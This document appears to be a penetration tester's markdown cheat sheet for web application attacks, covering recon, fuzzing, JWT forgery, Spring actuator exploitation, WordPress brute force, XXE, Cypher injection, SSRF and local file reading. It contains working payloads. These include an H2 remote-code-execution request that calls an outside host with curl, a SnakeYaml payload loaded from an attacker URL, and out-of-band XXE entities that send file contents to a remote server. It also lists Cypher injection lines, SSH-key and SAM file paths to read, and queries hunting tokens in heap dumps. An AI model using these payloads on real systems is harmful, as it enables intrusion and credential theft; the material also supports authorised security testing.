# web

## web methodology
### use the app like a traditional user
- saving interesting points and attacks ideas
    - blind xss
    - brute
    - idor

### identify technologies 
- headers / cookies
- file extensions
- provoke descriptive errors
- tools (wappalyzer, whatweb, whatruns)
- https://webanalyzer.me/
- builtwith.com
- searchdns.netcraft.com
- stackshare.io

### search for exploits
- [searching exploits](external.md#exploitation)

### information gathering
- [information gathering](external.md#searching-for-assets)
- check target in web archive

#### gathering users, emails, cpfs
- search engine "@company"
- theHarvester
- hunter.io, www.skymem.info, phonebook.cz
- look for passwords / hashes in leaked databases 
- [jbr_query.sh](jbr_query.sh)

### automated scan
- nuclei, burp
- `wpscan --random-user-agent --enumerate vp --plugins-detection aggressive --url example.com -o output.txt --api-token ... # https://wpscan.com/profile/`
- ~nikto, wapiti~
- ?rengine

### content discovery

#### app analysis and history
- web.archive.org
    - `curl 'https://web.archive.org/cdx/search?url=site.com.br&matchType=domain&fl=original&collapse=original&output=text&limit=100000' | sort -u`
- https://urlscan.io/
- getallurls (https://github.com/lc/gau): `cat domains.txt | getallurls -subs -random-agent -o gau.results.txt`
- https://github.com/xnl-h4ck3r/waymore: `waymore -i domains.txt -mode U -oU waymore.results.txt`
- get api endpoints in apks: https://github.com/dwisiswant0/apkleaks
- javascript parsing
    * `xnLinkFinder.py -i example.com -v -d2 -sp https://example.com` (https://github.com/xnl-h4ck3r/xnLinkFinder)
    * `xnLinkFinder -i waymore.results.txt -sf /tmp/domains.txt -o xnlinkfinder.results.txt`
    * GAP BApp (https://github.com/xnl-h4ck3r/GAP-Burp-Extension)
##### spider
* using burp > visit the domains, add a filter and check sitemap > run spider and repeat until a fatigue
* `katana -u example.com -H 'User-Agent: A' -o spider.katana.txt #-js-crawl -jsluice`
* `gospider -s https://example.com --depth 3 -u web #| grep -iEo '[^/]*example.com' | sort -u`
* `printf https://example.com | hakrawler -subs -h 'User-Agent: A' > spider.hakrawler.txt`

#### analysing results
- ?gowitness
- https://github.com/1ndianl33t/Gf-Patterns

#### bruting (fuzzing)
- wordlist
    - https://gist.github.com/morkin1792/6f7d25599d1d1779e41cdf035938a28e
    - https://github.com/digininja/CeWL
- ?using session token
* `cat web.txt | feroxbuster --stdin -r -k -A -d1 --smart --json  -o feroxbuster.results.json -w wordlist.txt #--parallel 1 --resume-from`
* `cat feroxbuster.results.json | jq 'select (.status == 200) | select (.path | test("\\.(js|css|png|ico)$") | not)' | jq -s 'sort_by(.content_length) | sort_by(.original_url) | .[] | {"url","path","status","content_length","word_count"}' -C | less -R`

### js sensitive information analysis
- https://github.com/m4ll0k/SecretFinder
- https://github.com/i5nipe/nipejs
- if find api key
    - https://github.com/streaak/keyhacks
    - `nuclei -t http/token-spray/ -var token=ABC`

### manual tests
- check [api.md](api.md)
- check [app_functionalities.md](app_functionalities.md)

### bypassing WAF

- A) change the payload
    - A2) charset encoding (body allow to specify, url/headers do not, even so they all should be checked)
- B) change the injection point (url, method or parameter)
    - B2) domain variations that resolves to the same target (origin.sub -> origin-sub, www -> www2) 
- C) [ip address history](external.md#finding-ips-and-asns)

## web technologies

### JWT
- a JWT is a specific type of a JWS (if it is signed) or a JWE (if it is encrypted)
    - https://datatracker.ietf.org/doc/html/rfc7519
    - not all JWSs are JWTs
        - the JWS payload don't need to be a JSON as in the JWT
        - JWS has 2 formats: Compact Serialization (used by JWT) and JSON Serialization
        - https://datatracker.ietf.org/doc/html/rfc7515
- signature exclusion
    - "alg": "none"
- key confusion 
    - idea: change RS256 (RSA, asymmetric) to HS256 (HMAC, symmetric) and use pub key as secret key to sign
    - https://portswigger.net/web-security/jwt/algorithm-confusion
- brute
    - `hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a`

#### jwt cognito
1) inside the jwt payload, check if scope is aws.cognito.signin.user.admin
2) use the jwt token with aws cli to check available attributes 
    - `aws cognito-idp get-user --access-token $JWT`
3) use the token to change the attributes
    - `aws cognito-idp update-user-attributes --access-token $JWT --user-attributes Name=email,Value=newemail@example.com`


### java
- ACL bypass
    * /foo../restrict
    * /foo;/restrict
    * scenario: nginx as reverse proxy of tomcat app
- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
- Log4Shell (CVE-2021-44228)
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md#payloads

### spring

- look for more paths, such as: /trace /httptrace
#### /env
##### A) hikari rce
```
POST /env HTTP/1.1
Host: target.app
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://x.burpcollaborator.net');"}
```
- https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/

##### B) exploiting SnakeYaml deseralization vulnerability
- create yml to exploit snakeyaml vulnerability, more details in https://github.com/artsploit/yaml-payload or https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/

- set the yml in the config
```http
POST /env HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://attacker/yaml-payload.yml
```

- load the yml
```http
POST /refresh
Host: target.com
```

#### /jolokia
* check if there is **reloadByURL** in `/jolokia/list/`
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
* https://github.com/mpgn/Spring-Boot-Actuator-Exploit

#### /heapdump

- In VisualVM, use **References** and then **"Open in a new Tab"** to find interesting things.
    - Try to recovery passwords/secrets from /env
```sql
/* interesting oql queries */
select s from java.lang.String s where s.toString().contains("postgres")
|| s.toString().contains("mysql")
|| s.toString().contains("secret")
|| s.toString().contains("authentication")
|| s.toString().contains("bearer")
|| s.toString().contains("basic")
|| s.toString().contains("jwt")

select s from java.lang.String s where s.toString().contains("eyJ")
|| s.toString().contains("MII")
|| s.toString().contains("AIza")
|| s.toString().contains("AWS")
|| s.toString().contains("AKIA")
|| s.toString().contains("ASIA")
|| s.toString().contains("ya29")
|| s.toString().contains("amzn")
|| s.toString().contains("github_pat_")
|| s.toString().contains("ghp_")
|| s.toString().contains("gho_")
|| s.toString().contains("ghu_")
|| s.toString().contains("ghs_")
|| s.toString().contains("ghr_")
|| s.toString().contains("cloudinary")
|| s.toString().contains("EAACEdEose0cBA")
|| s.toString().contains("PRIVATE KEY")
|| s.toString().contains("bucket_password")
|| s.toString().contains("app_key")
|| s.toString().contains("apikey")
```
### asp.net
```
TODO
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
https://www.youtube.com/watch?v=HrJW6Y9kHC4
https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
https://paulmuellersec.files.wordpress.com/2021/06/asp.netcryptocheatsheet.pdf
http://phototor.com/2019/02/04/microsoft-iis-rce-vulnerability-cve-2017-7269/
```

### glpi 
- files/_log/

### wordpress
- login brute force: `wpscan --url example.com -u admin -P wordlist.txt`
- brute enumerate users: `wpscan --url example.com --enumerate u 1-100`

- useful paths
```
/wp-json/wp/v2/users      # get all users
/?rest_route=/wp/v2/users # 

/wp-content/uploads/2023/ # upload directory

/wp-login.php             # login page
/login
/wp-admin
/admin
```

### http authentication
- search technology
- search unprotected paths
- brute force in creds

### firebase
- example.firebaseio.com/.json
- ?fuzzing tables names, ex: example.firebaseio.com/Users.json 
- https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database

### .git
- try clone / extract files
    * https://github.com/WangYihang/GitHacker
    * https://github.com/kost/dvcs-ripper
    * https://github.com/internetwache/GitTools
    * https://github.com/arthaud/git-dumper


### keycloak
- Try register replacing `auth` by `registrations` in the URL.
- REALM_NAME='master' -> check too the original realm_name from app
- /auth/realms/{REALM_NAME} -> pubkey to try downgrade attack
- /auth/realms/{REALM_NAME}/account -> admin interface
- /auth/realms/{REALM_Name}/.well-known/openid-configuration
- /auth/realms/{REALM_Name}/protocol/openid-connect/certs
- /auth/realms/{REALM_Name}/protocol/openid-connect/logout?redirect_uri=

### f5 big-ip tmui
- https://github.com/yassineaboukir/CVE-2020-5902
- https://www.exploit-db.com/exploits/50932
- https://www.exploit-db.com/exploits/49738
    


## web vulnerabilities

### SQLi
- https://sqlwiki.netspi.com/#mysql
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- [sqli](concepts/sqli.md)

### XSS
- https://gist.github.com/morkin1792/8c9d2f1095d803b075e7a5a9e2aadea7
- XSStrike
- dalfox

### XXE
    - read file: 1) eval 2) ?CDATA 3) php://
```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://myserver/a.dtd">
    %xxe;
]>
```

```xml
<!ENTITY % content SYSTEM "\\server\share\sites\example.com\api\web.config">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://myserver?%content;'>">
%eval;
%send;
```

### neo4j cypher injection
```
 LOAD CSV FROM 'https://attacker' as yl
 LOAD CSV FROM 'https://attacker' as yl//
})LOAD CSV FROM 'https://attacker' as yl
})LOAD CSV FROM 'https://attacker' as yl//
' LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE '3'='3
' LOAD CSV FROM 'https://attacker' as yl//
'})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:'3
'})LOAD CSV FROM 'https://attacker' as yl//
" LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE "3"="3
" LOAD CSV FROM 'https://attacker' as yl//
"})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:"3
"})LOAD CSV FROM 'https://attacker' as yl//
```

### SSRF
- [cloud metadata service address](cloud.md)
- other schemes (gopher, smb, file, php)
- ntlm relay && brute ntlm response
- brute hosts (leaked internal ips)
- path fuzzing
- cve no client http
- https://brightsec.com/blog/ssrf-server-side-request-forgery/
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### reading internal files

#### linux
```
/proc/self/environ 
/proc/self/cmdline
/home/$USER/.ssh/id_rsa
/home/$USER/.ssh/id_dsa
/home/$USER/.ssh/id_ecdsa
/home/$USER/.ssh/id_ed25519
/home/$USER/.ssh/identity
~/.ssh/...
```
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

#### windows
```
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Users\$USER\.ssh\id_rsa
c:\windows\system32\drivers\etc\hosts
c:\Windows\repair\SAM
c:\Windows\repair\system
c:\Windows\System32\config\SAM
c:\Windows\System32\config\SYSTEM
c:\Windows\System32\config\RegBack\SAM
c:\Windows\System32\config\RegBack\system
c:\Windows\System32\config\RegBack\SAM.OLD
c:\Windows\System32\config\RegBack\SYSTEM.OLD
c:\windows\debug\netsetup.log
c:\windows\system.ini
c:\windows\win.ini
```
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

#### general
- config files (https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Conf)
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-linux-and-windows_by-1N3%40CrowdShield.txt
```
file:///etc/passwd?/../../windows/win.ini
```
- enumerate users and then do a brute force (reading passwd, /home, C:/users)
- try list directories
- read leaked paths (descriptive errors)
    - brute to internal files
- php://input
- get ntlm response using UNC path (\\attackerServer\share)
- gopher
- what search internal? https://medium.com/@warrenbutterworth/oob-xxe-to-ssrf-to-windows-administrator-hashes-1f8ccd910624
